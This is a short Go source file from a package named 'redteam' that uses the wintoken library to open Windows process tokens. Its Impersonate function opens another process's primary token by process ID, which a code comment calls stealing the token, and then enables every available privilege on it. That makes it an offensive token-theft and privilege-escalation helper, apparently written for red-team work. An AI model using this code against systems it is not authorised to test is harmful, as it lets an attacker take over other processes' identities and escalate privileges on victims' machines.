package redteam

import (
	"github.com/fourcorelabs/wintoken"
	"golang.org/x/sys/windows"
)

func GetToken() (windows.Token, error) { // Get self token
	token, err := wintoken.OpenProcessToken(0, wintoken.TokenPrimary)
	if err != nil {
		return token.Token(), err
	}
	defer token.Close()

	return token.Token(), nil
}

func Impersonate(pid int) (windows.Token, error) {
	token, err := wintoken.OpenProcessToken(pid, wintoken.TokenPrimary) // Open process to steal token
	if err != nil {
		return token.Token(), err
	}
	defer token.Close()
	token.EnableAllPrivileges() // Enable all possible privileges

	return token.Token(), nil
}
